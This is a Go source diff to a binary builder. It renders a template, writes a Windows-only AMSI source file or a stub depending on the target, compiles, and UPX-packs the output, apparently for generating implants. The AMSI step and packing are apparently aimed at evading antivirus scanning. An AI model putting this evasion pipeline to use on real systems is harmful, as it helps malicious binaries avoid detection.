@@ -43,6 +43,7 @@ func (b *Builder) Build(cfg *BuildConfig) (string, error) {
 	}
 	defer os.RemoveAll(buildDir)
 
+	// 1. Renderizar y escribir main.go
 	src, err := RenderTemplate(cfg)
 	if err != nil {
 		return "", fmt.Errorf("builder: renderizar template: %w", err)
@@ -53,6 +54,22 @@ func (b *Builder) Build(cfg *BuildConfig) (string, error) {
 		return "", fmt.Errorf("builder: escribir main.go: %w", err)
 	}
 
+	// 2. Escribir el archivo de AMSI según el target. El código AMSI usa
+	//    golang.org/x/sys/windows, que no compila en Linux/darwin. Por eso
+	//    hay dos variantes y solo se escribe una.
+	var amsiPath, amsiSource string
+	if cfg.TargetOS == TargetWindows {
+		amsiPath = filepath.Join(buildDir, "amsi_windows.go")
+		amsiSource = amsiWindowsSource
+	} else {
+		amsiPath = filepath.Join(buildDir, "amsi_stub.go")
+		amsiSource = amsiStubSource
+	}
+	if err := os.WriteFile(amsiPath, []byte(amsiSource), 0o644); err != nil {
+		return "", fmt.Errorf("builder: escribir %s: %w", filepath.Base(amsiPath), err)
+	}
+
+	// 3. Compilar.
 	outputAbs, err := filepath.Abs(cfg.OutputPath)
 	if err != nil {
 		return "", fmt.Errorf("builder: resolver ruta de salida: %w", err)
@@ -83,7 +100,6 @@ func (b *Builder) Build(cfg *BuildConfig) (string, error) {
 	return outputAbs, nil
 }
 
-// buildArgs construye los argumentos de go build.
 func (b *Builder) buildArgs(cfg *BuildConfig, output string) []string {
 	args := []string{"build", "-o", output}
 
@@ -97,7 +113,6 @@ func (b *Builder) buildArgs(cfg *BuildConfig, output string) []string {
 	return args
 }
 
-// compress aplica UPX al binario si está disponible en el PATH.
 func (b *Builder) compress(binary string) error {
 	upxPath, err := exec.LookPath("upx")
 	if err != nil {
@@ -109,7 +124,6 @@ func (b *Builder) compress(binary string) error {
 	return cmd.Run()
 }
 
-// BuildResult agrupa el resultado de una compilación.
 type BuildResult struct {
 	BuildID    string
 	OutputPath string
